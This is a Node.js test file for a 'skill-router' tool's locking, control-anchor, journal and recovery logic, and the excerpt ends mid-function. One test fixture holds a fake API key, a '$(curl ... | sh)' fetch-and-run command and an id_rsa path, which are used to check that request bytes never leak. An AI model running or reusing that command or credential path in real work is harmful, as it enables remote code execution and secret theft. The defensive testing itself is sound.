// Phase 6 — control context, mutation/read/recovery runners, lock keying, and
// the pending-journal contract for every public command.
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { spawn } from "node:child_process";
import { chmod, lstat, mkdir, mkdtemp, readFile, readdir, rm, symlink, writeFile } from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { after, test } from "node:test";
import { fileURLToPath } from "node:url";
import {
  checkOperation,
  initOperation,
  recoverOperation,
  routeFileOperation,
  routeOperation,
  scanOperation,
  uninstallOperation,
} from "../src/operations.js";
import { durableFsInternals } from "../src/durable-fs.js";
import { JOURNAL_ERROR_CODES } from "../src/journal.js";
import { acquireMutationLock, controlPaths, LOCK_ERROR_CODES, MutationLockError } from "../src/mutation-lock.js";
import { journaledTransactionInternals } from "../src/transaction.js";
import {
  MUTATION_LOCK_TIMEOUT_MS,
  READ_LOCK_TIMEOUT_MS,
  RecoveryRequiredError,
  assertControlContext,
  normalizeLockTimeout,
  runControlledMutation,
  runControlledRead,
  runRecoveryOperation,
} from "../src/mutation-runner.js";
import { PLATFORM_ERROR_CODE, platformInternals } from "../src/platform.js";
import { ensureControlAnchor, readControlAnchor, resolveControlContext } from "../src/workspace.js";
import { createFakeClaudeRunner } from "./fake-claude.js";
import { digestTree } from "./journaled-harness.js";

const here = path.dirname(fileURLToPath(import.meta.url));
const fixtures = path.join(here, "fixtures");
const SENTINEL = "SENTINEL-request-9d2b-must-not-reach-control-data";

/**
 * Host-independent OpenCode capability: every operation in this file inherits
 * a fake `opencode` that prints exactly one clean semantic version, so the
 * bounded capability probe resolves the same skills shape on every machine.
 * Public init/uninstall/check depend on the probe outcome (an unknown shape
 * defers the OpenCode config write and leaves the install incoherent), so
 * these tests must never depend on whatever OpenCode happens to be installed.
 */
const openCodeProbeDirectory = await mkdtemp(path.join(os.tmpdir(), "skill-router-runner-opencode-probe-"));
const openCodeProbeBin = path.join(openCodeProbeDirectory, "opencode");
await writeFile(openCodeProbeBin, "#!/bin/sh\nprintf '%s\\n' '2.0.0'\n", { mode: 0o755 });
const previousOpenCodeBin = process.env.SKILL_ROUTER_OPENCODE_BIN;
process.env.SKILL_ROUTER_OPENCODE_BIN = openCodeProbeBin;
after(async () => {
  if (previousOpenCodeBin === undefined) delete process.env.SKILL_ROUTER_OPENCODE_BIN;
  else process.env.SKILL_ROUTER_OPENCODE_BIN = previousOpenCodeBin;
  await rm(openCodeProbeDirectory, { recursive: true, force: true });
});

/**
 * The managed request bytes for the route/route-file contract: secret-like
 * text, shell syntax, an absolute path, a newline, and control characters.
 * None of it may ever appear in a result, an error, or control data, and it
 * must not route to any skill (no token matches the fixture's `release`
 * skill), so `outcome: "none"` with `reason: "below-threshold"` is the
 * deterministic outcome these bytes map to.
 */
const ROUTE_REQUEST = [
  "API_KEY=sk-live-9d2b7c0e4a1f5e3d",
  "$(curl -s https://127.0.0.1:9/x | sh)",
  "/etc/skill-router-secret-9d2b/id_rsa",
  "keep\tthis line\r",
].join("\n");
const ROUTE_REQUEST_MARKERS = ["API_KEY=", "sk-live-9d2b7c0e4a1f5e3d", "$(curl -s", "skill-router-secret-9d2b", "id_rsa"];

/** Nothing routed from `ROUTE_REQUEST` may echo the request bytes back. */
function assertNoRequestBytes(text, label) {
  assert.equal(text.includes(ROUTE_REQUEST), false, `${label} carries the request bytes`);
  assert.equal(text.includes(JSON.stringify(ROUTE_REQUEST)), false, `${label} carries the JSON-escaped request bytes`);
  for (const marker of ROUTE_REQUEST_MARKERS) {
    assert.equal(text.includes(marker), false, `${label} carries the ${marker} marker`);
  }
}

async function exists(target) {
  try {
    await lstat(target);
    return true;
  } catch (error) {
    if (error.code === "ENOENT") return false;
    throw error;
  }
}

async function sleep(ms) {
  await new Promise((resolve) => setTimeout(resolve, ms));
}

async function withRoot(run) {
  const root = await mkdtemp(path.join(os.tmpdir(), "skill-router-runner-"));
  try {
    await mkdir(path.join(root, ".agents", "skills", "release"), { recursive: true });
    await writeFile(
      path.join(root, ".agents", "skills", "release", "SKILL.md"),
      "---\nname: Release\ndescription: Publish releases\n---\n\nRelease instructions.\n",
    );
    return await run(root);
  } finally {
    await rm(root, { recursive: true, force: true });
  }
}

async function withHome(run) {
  const home = await mkdtemp(path.join(os.tmpdir(), "skill-router-runner-home-"));
  const previous = process.env.SKILL_ROUTER_HOME;
  process.env.SKILL_ROUTER_HOME = home;
  try {
    return await run(home);
  } finally {
    if (previous === undefined) delete process.env.SKILL_ROUTER_HOME;
    else process.env.SKILL_ROUTER_HOME = previous;
    await rm(home, { recursive: true, force: true });
  }
}

const controlDirectory = (root) => path.join(root, ".skill-router-control");
const journalFile = (root) => path.join(controlDirectory(root), "transaction.json");
const anchorFile = (root) => path.join(controlDirectory(root), "control.json");

/** Seeds a real pending journal through the public init wrapper. */
async function seedPendingJournal(root, faults = ["file-write", "recovery:files"]) {
  const original = journaledTransactionInternals.onStep;
  journaledTransactionInternals.onStep = async (name) => {
    if (faults.includes(name)) {
      const error = new Error(`stop at ${name}`);
      error.injected = true;
      throw error;
    }
  };
  try {
    await initOperation({ root }).catch(() => {});
  } finally {
    journaledTransactionInternals.onStep = original;
  }
  assert.ok(await exists(journalFile(root)), "a pending journal was seeded");
  return journalFile(root);
}

async function controlEntries(root) {
  try {
    return (await readdir(controlDirectory(root))).sort();
  } catch (error) {
    if (error.code === "ENOENT") return null;
    throw error;
  }
}

function isControlLocked(error) {
  return error instanceof MutationLockError && error.code === LOCK_ERROR_CODES.MUTATION_LOCKED;
}

/* ================================================================== *
 * Lock timeouts and drift refusal
 * ================================================================== */

test("lock timeouts are strict integers in the accepted range", () => {
  assert.equal(MUTATION_LOCK_TIMEOUT_MS, 10000, "mutations wait 10s by default");
  assert.equal(READ_LOCK_TIMEOUT_MS, 2000, "reads wait 2s by default");
  assert.equal(normalizeLockTimeout(undefined, MUTATION_LOCK_TIMEOUT_MS), MUTATION_LOCK_TIMEOUT_MS);
  assert.equal(normalizeLockTimeout(null, READ_LOCK_TIMEOUT_MS), READ_LOCK_TIMEOUT_MS);
  assert.equal(normalizeLockTimeout("", READ_LOCK_TIMEOUT_MS), READ_LOCK_TIMEOUT_MS);
  assert.equal(normalizeLockTimeout(0, MUTATION_LOCK_TIMEOUT_MS), 0);
  assert.equal(normalizeLockTimeout("250", MUTATION_LOCK_TIMEOUT_MS), 250);
  for (const bad of ["-1", "1.5", "1e3", "abc", "0x10", " 10", "300001", 300001, Number.NaN, Infinity, {}, []]) {
    assert.throws(() => normalizeLockTimeout(bad, MUTATION_LOCK_TIMEOUT_MS), /--lock-timeout must be an integer between 0 and 300000/);
  }
});

test("a control context that changes while the lock is held refuses", () => {
  const paths = controlPaths({ root: "/tmp/installation" });
  const context = { scope: "project", global: false, root: "/tmp/installation", anchorRoot: "/tmp/installation", paths };
  assert.doesNotThrow(() => assertControlContext(context, { root: "/tmp/installation", global: false }, paths));
  assert.throws(
    () => assertControlContext(context, { root: "/tmp/elsewhere", global: false }, paths),
    (error) => error.code === LOCK_ERROR_CODES.LOCK_FOREIGN && /root changed/.test(error.message),
  );
  assert.throws(
    () => assertControlContext(context, { root: "/tmp/installation", global: true }, paths),
    (error) => error.code === LOCK_ERROR_CODES.LOCK_FOREIGN && /scope changed/.test(error.message),
  );
});

/* ================================================================== *
 * Control anchor lifecycle
 * ================================================================== */

test("a real mutation creates a strict owner-only control anchor", async () => {
  await withRoot(async (root) => {
    assert.equal(await exists(anchorFile(root)), false, "no anchor before the first mutation");
    const init = await initOperation({ root });
    assert.equal(init.command, "init");

    const raw = await readFile(anchorFile(root), "utf8");
    const document = JSON.parse(raw);
    assert.deepEqual(Object.keys(document).sort(), ["createdAt", "owner", "root", "schemaVersion", "scope"]);
    assert.equal(document.schemaVersion, 1);
    assert.equal(document.owner, "skill-router");
    assert.equal(document.scope, "project");
    assert.equal(document.root, root);
    const stat = await lstat(anchorFile(root));
    assert.equal(stat.mode & 0o777, 0o600, "the anchor is owner-only");
    assert.equal(stat.isSymbolicLink(), false);

    // The anchor resolves the same control context on a later run.
    const context = await resolveControlContext({ root });
    assert.equal(context.root, root);
    assert.deepEqual(context.paths, controlPaths({ root }));
    assert.equal((await readControlAnchor(context.paths, { scope: "project", root })).owner, "skill-router");
  });
});

test("a fresh dry-run, read, and clean recovery leave no anchor, journal, or control directory", async () => {
  await withRoot(async (root) => {
    const dry = await initOperation({ root, dryRun: true });
    assert.equal(dry.dryRun, true);
    // R1: a run never removes the control directories it created - they are
    // empty, owner-private, and inert.
    assert.equal(await exists(controlDirectory(root)), true, "dry-run leaves the (empty) control directory in place");
    assert.deepEqual(await readdir(controlDirectory(root)), [], "it is empty: no anchor, lock, or journal");

    await assert.rejects(() => routeOperation("release", { root }), /not initialized/);
    assert.deepEqual(await readdir(controlDirectory(root)), [], "reads leave it empty");

    const fresh = await recoverOperation({ root });
    assert.deepEqual(fresh, { command: "recover", status: "clean" });
    assert.deepEqual(await readdir(controlDirectory(root)), [], "a clean recovery leaves it empty");
    assert.equal(await exists(anchorFile(root)), false, "no anchor exists");
    assert.equal(await exists(path.join(root, ".skill-router.json")), false, "and never writes the configuration");
  });
});

test("a failed mutation without a journal removes the anchor it created", async () => {
  await withRoot(async (root) => {
    // A reserved skill ID is rejected during discovery, before any journal exists.
    const source = path.join(root, ".agents", "skills", "skill-router", "SKILL.md");
    await mkdir(path.dirname(source), { recursive: true });
    await writeFile(source, "---\nname: skill-router\ndescription: Impostor\n---\n\nBody.\n");
    await assert.rejects(
      () => initOperation({ root, harness: "opencode" }),
      /derived skill ID is not a portable public ID \(reason: reserved\)/,
    );
    assert.equal(await exists(anchorFile(root)), false, "the anchor this run created is removed");
    assert.equal(await exists(journalFile(root)), false);
    assert.equal(await exists(controlDirectory(root)), true, "the (now empty) control directory is preserved");
    assert.deepEqual(await readdir(controlDirectory(root)), [], "it is left empty and inert");
    assert.equal(await exists(path.join(root, ".skill-router")), false, "nothing was staged");
  });
});

test("anchors that are foreign fail closed with LOCK_FOREIGN", async () => {
  await withRoot(async (root) => {
    const other = path.join(root, "elsewhere.json");
    await writeFile(other, `${JSON.stringify({ schemaVersion: 1, sources: [] }, null, 2)}\n`);
    await mkdir(controlDirectory(root), { recursive: true, mode: 0o700 });
    const paths = controlPaths({ root });

    const cases = [
      ["a foreign root", { ...validAnchor(root), root: path.join(root, "elsewhere") }],
      ["a foreign scope", { ...validAnchor(root), scope: "global" }],
      ["a foreign owner", { ...validAnchor(root), owner: "attacker" }],
      ["a foreign schema", { ...validAnchor(root), schemaVersion: 2 }],
      ["an unknown field", { ...validAnchor(root), extra: "field" }],
      ["a missing field", (() => { const copy = { ...validAnchor(root) }; delete copy.createdAt; return copy; })()],
      ["a relative root", { ...validAnchor(root), root: "relative/path" }],
    ];
    for (const [label, document] of cases) {
      await writeFile(anchorFile(root), `${JSON.stringify(document)}\n`, { mode: 0o600 });
      await assert.rejects(
        () => initOperation({ root, lockTimeout: 5000 }),
        (error) => error instanceof MutationLockError && error.code === LOCK_ERROR_CODES.LOCK_FOREIGN,
        `${label} is refused`,
      );
      assert.equal(await exists(path.join(root, ".skill-router")), false, `${label} mutates nothing`);
    }

    // Malformed bytes and a wrong mode refuse as well.
    await writeFile(anchorFile(root), "{ not json", { mode: 0o600 });
    await assert.rejects(
      () => initOperation({ root }),
      (error) => error.code === LOCK_ERROR_CODES.LOCK_FOREIGN,
      "malformed anchor is refused",
    );
    await rm(anchorFile(root), { force: true });
    await writeFile(anchorFile(root), `${JSON.stringify(validAnchor(root))}\n`, { mode: 0o644 });
    await assert.rejects(
      () => initOperation({ root }),
      (error) => error.code === LOCK_ERROR_CODES.LOCK_FOREIGN && /owner-only/.test(error.message),
      "an over-permissive anchor is refused",
    );

    // A symlinked anchor is never followed.
    await rm(anchorFile(root), { force: true });
    await writeFile(other, `${JSON.stringify(validAnchor(root))}\n`, { mode: 0o600 });
    await symlink(other, anchorFile(root));
    await assert.rejects(
      () => initOperation({ root }),
      (error) => error.code === LOCK_ERROR_CODES.LOCK_FOREIGN && /symbolic link/.test(error.message),
    );
    assert.equal(await readFile(other, "utf8").then((text) => JSON.parse(text).root), root, "the link target is untouched");
    await rm(anchorFile(root), { force: true });
  });
});

function validAnchor(root) {
  return {
    schemaVersion: 1,
    owner: "skill-router",
    scope: "project",
    root,
    createdAt: new Date().toISOString(),
  };
}

test("a global anchor records the router home and stays valid from any cwd", async () => {
  await withHome(async (home) => {
    const project = await mkdtemp(path.join(os.tmpdir(), "skill-router-runner-global-"));
    try {
      const init = await initOperation({ root: project, global: true });
      assert.equal(init.scope, "global");
      const paths = controlPaths({ home, global: true });
      const anchor = await readControlAnchor(paths);
      assert.equal(anchor.scope, "global");
      assert.equal(anchor.root, home, "the anchor binds the home, not the invoking project");
      // Another cwd still resolves the same control key and validates it.
      const elsewhere = await mkdtemp(path.join(os.tmpdir(), "skill-router-runner-cwd-"));
      try {
        const context = await resolveControlContext({ root: elsewhere, global: true });
        assert.deepEqual(context.paths, paths);
        assert.equal((await readControlAnchor(paths, { scope: "global", root: home })).scope, "global");
      } finally {
        await rm(elsewhere, { recursive: true, force: true });
      }
    } finally {
      await rm(project, { recursive: true, force: true });
    }
  });
});

/* ================================================================== *
 * Pending journals and the read contract
 * ================================================================== */

test("dry-run mutations refuse a pending journal with RECOVERY_REQUIRED and recover nothing", async () => {
  await withRoot(async (root) => {
    await initOperation({ root });
    const journal = await seedPendingJournal(root);
    const journalBefore = await readFile(journal, "utf8");
    const configBefore = await readFile(path.join(root, ".skill-router.json"), "utf8");

    for (const run of [
      () => initOperation({ root, dryRun: true }),
      () => initOperation({ root, dryRun: true, harness: "all" }),
      () => scanOperation({ root, dryRun: true }),
    ]) {
      await assert.rejects(
        run,
        (error) => error instanceof RecoveryRequiredError && error.code === "RECOVERY_REQUIRED",
      );
    }
    assert.equal(await readFile(journal, "utf8"), journalBefore, "dry-run never touches the journal");
    assert.equal(await readFile(path.join(root, ".skill-router.json"), "utf8"), configBefore);
  });
});

test("route and route-file refuse a pending journal and the request survives", async () => {
  // The home is isolated so the registry (and therefore the routed outcome)
  // is exactly the fixture's `release` skill.
  await withHome(async () => {
    await withRoot(async (root) => {
      await initOperation({ root });
      // The request belongs to the healthy prior state, so the seeded crash and
      // its recovery preserve it byte for byte.
      const token = "0123456789abcdef0123456789abcdef";
      const requestFile = path.join(root, ".skill-router-requests", `${token}.txt`);
      await writeFile(requestFile, ROUTE_REQUEST, { mode: 0o600 });
      // Crash before the state rename so the prior state (and the request with
      // it) is still canonical when the refusals run.
      await seedPendingJournal(root, ["stage:build", "recovery:files"]);

      // Both transports refuse before any route is produced, and neither the
      // captured error nor its message carries the request bytes or the token.
      const positionalRefusal = await routeOperation(ROUTE_REQUEST, { root }).then(
        () => null,
        (error) => error,
      );
      const tokenRefusal = await routeFileOperation(token, { root }).then(() => null, (error) => error);
      for (const [label, error] of [
        ["positional refusal", positionalRefusal],
        ["request-token refusal", tokenRefusal],
      ]) {
        assert.ok(error instanceof RecoveryRequiredError, `${label} is RECOVERY_REQUIRED`);
        assert.equal(error.code, "RECOVERY_REQUIRED", label);
        assertNoRequestBytes(`${error.name}: ${error.message}\n${error.stack ?? ""}`, `${label} error`);
        assert.equal(
          `${error.message}`.includes(token),
          false,
          `${label} error must not echo the request token`,
        );
      }
      assert.equal(await readFile(requestFile, "utf8"), ROUTE_REQUEST, "the request is consumed only after recovery");

      // After recovery the same request routes normally and is consumed once.
      const recovered = await recoverOperation({ root });
      assert.equal(recovered.status, "recovered");
      const routed = await routeFileOperation(token, { root });
      assert.equal(routed.command, "route");
      assert.equal(Object.hasOwn(routed, "request"), false, "the route result carries no request field");
      // The sentinel maps deterministically to this outcome, so the surviving
      // bytes are what routed — proven without echoing them back.
      assert.equal(routed.outcome, "none");
      assert.equal(routed.reason, "below-threshold");
      assertNoRequestBytes(JSON.stringify(routed), "route result");
      assert.equal(JSON.stringify(routed).includes(token), false, "the route result does not echo the token");
      // The same bytes routed positionally produce identical routing metadata.
      assert.deepEqual(
        routed,
        await routeOperation(ROUTE_REQUEST, { root }),
        "the surviving request bytes are what routes",
      );
      assert.equal(await exists(requestFile), false, "the request is consumed exactly once");
      assert.equal(await exists(journalFile(root)), false);
    });
  });
});

test("check reports one bounded diagnostic for pending, invalid, and locked control planes", async () => {
  await withRoot(async (root) => {
    await initOperation({ root });
    const runner = createFakeClaudeRunner();
    await seedPendingJournal(root);

    runner.log.length = 0;
    const pending = await checkOperation({ root, claudeExec: runner });
    assert.equal(pending.healthy, false);
    assert.equal(pending.diagnostics.length, 1, "exactly one diagnostic");
    assert.equal(pending.diagnostics[0].code, "recovery-required");
    assert.match(pending.diagnostics[0].message, /skill-router recover/);
    assert.ok(pending.diagnostics[0].message.length <= 400, "the message is bounded");
    assert.deepEqual(runner.log, [], "a pending journal skips Claude probing");
    assert.equal(pending.root, root);

    // Malformed journal: fail closed with a distinct bounded diagnostic.
    await writeFile(journalFile(root), "{ not json");
    const invalid = await checkOperation({ root, claudeExec: runner });
    assert.equal(invalid.healthy, false);
    assert.equal(invalid.diagnostics.length, 1);
    assert.equal(invalid.diagnostics[0].code, "invalid-journal");
    assert.deepEqual(runner.log, [], "a malformed journal skips Claude probing too");
    await assert.rejects(
      () => recoverOperation({ root }),
      (error) => error.code === JOURNAL_ERROR_CODES.JOURNAL_INVALID,
    );
    await rm(journalFile(root), { force: true });

    // A live lock: mutations and route throw, check reports mutation-locked.
    const paths = controlPaths({ root });
    const lease = await acquireMutationLock(paths, { timeoutMs: 5000, heartbeatMs: 200 });
    try {
      await assert.rejects(() => initOperation({ root, lockTimeout: 0 }), isControlLocked);
      await assert.rejects(() => routeOperation("release", { root, lockTimeout: 0 }), isControlLocked);
      const locked = await checkOperation({ root, lockTimeout: 0, claudeExec: runner });
      assert.equal(locked.healthy, false);
      assert.equal(locked.diagnostics.length, 1);
      assert.equal(locked.diagnostics[0].code, "mutation-locked");
      assert.deepEqual(runner.log, []);
    } finally {
      await lease.release();
    }
  });
});

test("an auto-recovering mutation continues exactly once and cleans every artifact", async () => {
  await withRoot(async (root) => {
    await initOperation({ root });
    const configBefore = await readFile(path.join(root, ".skill-router.json"), "utf8");
    await seedPendingJournal(root);
    const seeded = JSON.parse(await readFile(journalFile(root), "utf8"));
    assert.equal(seeded.mode, "rollback", "the seeded crash left a rollback journal");

    const init = await initOperation({ root });
    assert.equal(init.command, "init");
    assert.equal(await exists(journalFile(root)), false, "the journal is consumed by the auto-recovery");

    const entries = await readdir(root);
    assert.deepEqual(entries.filter((entry) => entry.includes(".stage-")), [], "the stale stage is cleaned exactly once");
    assert.deepEqual(entries.filter((entry) => entry.includes(".backup-")), [], "no backup survives");
    assert.deepEqual(
      // `.skill-router-requests` is the stable request spool, an intentional
      // installation artifact rather than a transaction payload.
      entries.filter(
        (entry) => entry !== ".skill-router-control" && entry !== ".skill-router-requests" && entry.includes(".skill-router-"),
      ),
      [],
      "no payload survives",
    );
    assert.deepEqual(await controlEntries(root), ["control.json"], "control data holds only the anchor");
    assert.equal(typeof configBefore, "string");
    assert.equal((await checkOperation({ root })).healthy, true, "the installation is coherent after auto-recovery");

    // Repeating the command is idempotent and never recovers again.
    const again = await initOperation({ root });
    assert.equal(again.fingerprint, init.fingerprint);
    assert.deepEqual(await controlEntries(root), ["control.json"]);
    const clean = await recoverOperation({ root });
    assert.deepEqual(clean, { command: "recover", status: "clean" });
  });
});

test("recovery reports the seeded transaction and is repeatable", async () => {
  await withRoot(async (root) => {
    await initOperation({ root });
    const journal = JSON.parse(await readFile(await seedPendingJournal(root), "utf8"));

    const first = await recoverOperation({ root });
    assert.equal(first.command, "recover");
    assert.equal(first.status, "recovered");
    assert.equal(first.transactionId, journal.transactionId);
    assert.equal(first.kind, "managed");
    assert.equal(first.outcome, "rolled-back");
    assert.equal(first.conflicts, undefined, "no concurrent edit was reported");

    const second = await recoverOperation({ root });
    assert.deepEqual(second, { command: "recover", status: "clean" });
    assert.equal(await exists(journalFile(root)), false);
  });
});

test("journal and control JSON never carry request, body, or environment sentinels", async () => {
  await withRoot(async (root) => {
    process.env.SKILL_ROUTER_SENTINEL = `${SENTINEL}-env`;
    try {
      // Configuration body and a request file both carry the sentinel.
      await initOperation({ root });
      const requestFile = path.join(root, ".skill-router-requests", "aa".repeat(16) + ".txt");
      await writeFile(requestFile, `${SENTINEL}\n`, { mode: 0o600 });
      await writeFile(
        path.join(root, ".skill-router.json"),
        `${JSON.stringify({ schemaVersion: 1, sources: [], note: SENTINEL }, null, 2)}\n`,
      );
      await seedPendingJournal(root);

      const control = await readFile(anchorFile(root), "utf8");
      assert.equal(control.includes(SENTINEL), false, "the anchor carries no body or request content");
      const journal = await readFile(journalFile(root), "utf8");
      assert.equal(journal.includes(SENTINEL), false, "the journal carries no body or request content");
      assert.equal(journal.includes(`${SENTINEL}-env`), false, "the journal carries no environment content");
      assert.equal(journal.includes("SKILL_ROUTER_SENTINEL"), false);
    } finally {
      delete process.env.SKILL_ROUTER_SENTINEL;
    }
  });
});

/* ================================================================== *
 * Cross-process contention on one lock key
 * ================================================================== */

function startHolder(config) {
  const child = spawn(process.execPath, [path.join(fixtures, "hold-mutation-lock.mjs"), JSON.stringify(config)], {
    stdio: ["ignore", "pipe", "pipe"],
  });
  let stderr = "";
  child.stderr.on("data", (chunk) => (stderr += chunk));
  child.stdout.resume();
  return {
    child,
    async ready() {
      for (let attempt = 0; attempt < 400; attempt += 1) {
        if (await exists(config.readyFile)) return;
        if (child.exitCode !== null) throw new Error(`lock holder exited early: ${stderr}`);
        await sleep(25);
      }
      throw new Error("lock holder never became ready");
    },
    released: false,
    async release() {
      if (this.released) return;
      this.released = true;
      await writeFile(config.releaseFile, "go");
      await new Promise((resolve) => child.on("exit", resolve));
    },
  };
}

test("parallel contenders on one installation: exactly one mutation enters", async () => {
  await withRoot(async (root) => {
    await initOperation({ root });
    const nested = path.join(root, "nested");
    await mkdir(nested, { recursive: true });
    const holder = startHolder({
      root,
      readyFile: path.join(root, "ready"),
      releaseFile: path.join(root, "release"),
    });
    await holder.ready();
    try {
      // Same lock key: nested, explicit, and plain contexts all contend on the
      // installation's control directory.
      await assert.rejects(() => initOperation({ root: nested, lockTimeout: 0 }), isControlLocked);
      await assert.rejects(
        () => initOperation({ root, config: path.join(root, ".skill-router.json"), lockTimeout: 0 }),
        isControlLocked,
      );
      await assert.rejects(() => scanOperation({ root, lockTimeout: 0 }), isControlLocked);
      await assert.rejects(() => routeOperation("release", { root, lockTimeout: 0 }), isControlLocked);

      // A waiting contender succeeds once the holder releases.
      const waiting = initOperation({ root, lockTimeout: 8000 });
      await sleep(150);
      await holder.release();
      const result = await waiting;
      assert.equal(result.command, "init");
    } finally {
      if (holder.child.exitCode === null) await holder.release();
    }
    assert.equal(await exists(path.join(root, "ready")), true);
    await rm(path.join(root, "ready"), { force: true });
  });
});

test("a global mutation contends on the router-home lock key", async () => {
  await withHome(async (home) => {
    const project = await mkdtemp(path.join(os.tmpdir(), "skill-router-runner-global-"));
    try {
      await initOperation({ root: project, global: true });
      const holder = startHolder({
        home,
        global: true,
        readyFile: path.join(home, "ready"),
        releaseFile: path.join(home, "release"),
      });
      await holder.ready();
      try {
        await assert.rejects(() => initOperation({ root: project, global: true, lockTimeout: 0 }), isControlLocked);
        await assert.rejects(() => recoverOperation({ root: project, global: true, lockTimeout: 0 }), isControlLocked);
      } finally {
        await holder.release();
      }
      await rm(path.join(home, "ready"), { force: true });
      const clean = await recoverOperation({ root: project, global: true });
      assert.deepEqual(clean, { command: "recover", status: "clean" });
    } finally {
      await rm(project, { recursive: true, force: true });
    }
  });
});

test("control resolution walks to the nearest config or anchor before the Git boundary", async () => {
  await withRoot(async (root) => {
    // Config at the root, nested cwd, no boundary: nearest ancestor wins.
    await initOperation({ root });
    const nested = path.join(root, "a", "b");
    await mkdir(nested, { recursive: true });
    assert.equal((await resolveControlContext({ root: nested })).root, root);
    assert.equal((await resolveControlContext({ root: nested, config: path.join(root, ".skill-router.json") })).root, nested);

    // A Git boundary stops the walk: nothing above the boundary is searched.
    const repo = path.join(root, "repo");
    const deeper = path.join(repo, "src", "deep");
    await mkdir(path.join(repo, ".git"), { recursive: true });
    await mkdir(deeper, { recursive: true });
    assert.equal((await resolveControlContext({ root: deeper })).root, deeper, "no ancestor above the boundary is adopted");

    // A fresh init interrupted before its configuration is resolved by the
    // control anchor alone.
    const anchored = path.join(root, "anchored");
    await mkdir(anchored, { recursive: true });
    const anchorPaths = controlPaths({ root: anchored });
    await mkdir(anchorPaths.controlDirectory, { recursive: true, mode: 0o700 });
    await ensureControlAnchor({ paths: anchorPaths, scope: "project", root: anchored, allowCreate: true });
    const fromChild = path.join(anchored, "child");
    await mkdir(fromChild, { recursive: true });
    assert.equal((await resolveControlContext({ root: fromChild })).root, anchored, "the anchor resolves the root");

    // A symlinked control anchor is never followed as an ownership signal: it
    // cannot make a fresh directory look like an installation.
    const isolated = await mkdtemp(path.join(os.tmpdir(), "skill-router-runner-link-"));
    try {
      await symlink(anchorPaths.controlDirectory, path.join(isolated, ".skill-router-control"));
      assert.equal(
        (await resolveControlContext({ root: isolated })).root,
        isolated,
        "a symlinked anchor is skipped",
      );
      await assert.rejects(
        () => initOperation({ root: isolated }),
        (error) =>
          error.code === LOCK_ERROR_CODES.LOCK_FOREIGN ||
          error.code === LOCK_ERROR_CODES.LOCK_COMPROMISED,
        "and it is refused at use time by the lock or the anchor check",
      );
      assert.equal(await exists(path.join(isolated, ".skill-router")), false, "no installation is created through it");
    } finally {
      await rm(isolated, { recursive: true, force: true });
    }
  });
});

test("a fresh global control directory and its created parents are preserved after a clean run", async () => {
  await withHome(async (home) => {
    const project = await mkdtemp(path.join(os.tmpdir(), "skill-router-runner-global-fresh-"));
    try {
      assert.equal(await exists(path.join(home, ".local")), false, "the fixture home starts empty");

      const clean = await recoverOperation({ root: project, global: true });
      assert.deepEqual(clean, { command: "recover", status: "clean" });
      // R1: directories this run created are deliberately left in place -
      // empty owner-private leftovers are safe and are never removed by path.
      const controlDir = path.join(home, ".local", "share", "skill-router-control");
      assert.equal(await exists(controlDir), true, "the created control directory is preserved");
      assert.deepEqual(await readdir(controlDir), [], "it is left empty and inert");
      if (process.platform !== "win32") {
        assert.equal((await lstat(controlDir)).mode & 0o777, 0o700, "it stays owner-private");
      }

      // A real mutation keeps its anchor and directory across later runs.
      await initOperation({ root: project, global: true });
      const anchor = path.join(home, ".local", "share", "skill-router-control", "control.json");
      assert.equal(await exists(anchor), true, "the global anchor lives in the router home");
      await recoverOperation({ root: project, global: true });
      assert.equal(await exists(anchor), true, "an existing anchor is never removed");
    } finally {
      await rm(project, { recursive: true, force: true });
    }
  });
});

/* ================================================================== *
 * Gate 6 lane A — the control anchor is validated before any recovery
 * ================================================================== */

const PAYLOAD_NAME = /\.skill-router-[0-9a-f]{64}\./;

function isMutatingClaudeCommand(line) {
  if (typeof line !== "string" || !line.startsWith("plugin ")) return false;
  return (
    line.startsWith("plugin install ") ||
    line.startsWith("plugin update ") ||
    line.startsWith("plugin uninstall ") ||
    line.startsWith("plugin marketplace add") ||
    line.startsWith("plugin marketplace remove") ||
    line.startsWith("plugin marketplace rm")
  );
}

async function hashFileOrNull(file) {
  try {
    return createHash("sha256").update(await readFile(file)).digest("hex");
  } catch (error) {
    if (error.code === "ENOENT") return null;
    throw error;
  }
}

async function readNullable(file) {
  try {
    return await readFile(file, "utf8");
  } catch (error) {
    // Missing -> null; a hostile "wrong type" anchor is a directory, which is
    // still a stable snapshot value.
    if (error.code === "ENOENT") return null;
    if (error.code === "EISDIR") return "<directory>";
    throw error;
  }
}

async function listSafely(directory) {
  try {
    return (await readdir(directory)).sort();
  } catch (error) {
    if (error.code === "ENOENT") return [];
    throw error;
  }
}

/** Every payload byte next to every target a journaled transaction touches. */
async function payloadInventory(root) {
  const found = [];
  for (const directory of [root, path.join(root, ".opencode")]) {
    for (const name of await listSafely(directory)) {
      if (!PAYLOAD_NAME.test(name)) continue;
      const full = path.join(directory, name);
      found.push(`${path.relative(root, full)}=${await hashFileOrNull(full)}`);
    }
  }
  return found.sort();
}

/**
 * Everything a hostile anchor must leave byte-identical: canonical state,
 * configuration and payload bytes, the journal, the anchor itself, the fake
 * Claude log (read-only and mutating), and the artifact sets.
 */
async function snapshotTransaction(root, runner) {
  return {
    state: await digestTree(path.join(root, ".skill-router")),
    config: await hashFileOrNull(path.join(root, ".skill-router.json")),
    openCode: await hashFileOrNull(path.join(root, ".opencode", "opencode.json")),
    payloads: await payloadInventory(root),
    journal: await readNullable(journalFile(root)),
    anchor: await readNullable(anchorFile(root)),
    claudeLog: [...runner.log],
    claudeMutations: runner.log.filter(isMutatingClaudeCommand).length,
    rootEntries: await listSafely(root),
    controlEntries: await listSafely(controlDirectory(root)),
    opencodeEntries: await listSafely(path.join(root, ".opencode")),
  };
}

/** Pending managed journal whose registration landed before the interruption. */
async function seedPendingManagedJournal(root, runner) {
  const original = journaledTransactionInternals.onStep;
  journaledTransactionInternals.onStep = async (name) => {
    if (name === "journal:proven" || name === "recovery:files") {
      const error = new Error(`stop at ${name}`);
      error.injected = true;
      throw error;
    }
  };
  try {
    await initOperation({ root, harness: "all", claudeExec: runner }).catch(() => {});
  } finally {
    journaledTransactionInternals.onStep = original;
  }
  const document = JSON.parse(await readFile(journalFile(root), "utf8"));
  assert.equal(document.kind, "managed");
  assert.equal(document.mode, "rollback");
  assert.equal(document.claude?.prior, "absent");
  assert.equal(runner.state.marketplaces.length, 1, "the registration landed before the interruption");
  assert.equal(runner.state.plugins.length, 1, "the plugin landed before the interruption");
}

/** Pending removal journal: detached Claude, interrupted at the commit rename. */
async function seedPendingRemovalJournal(root, runner) {
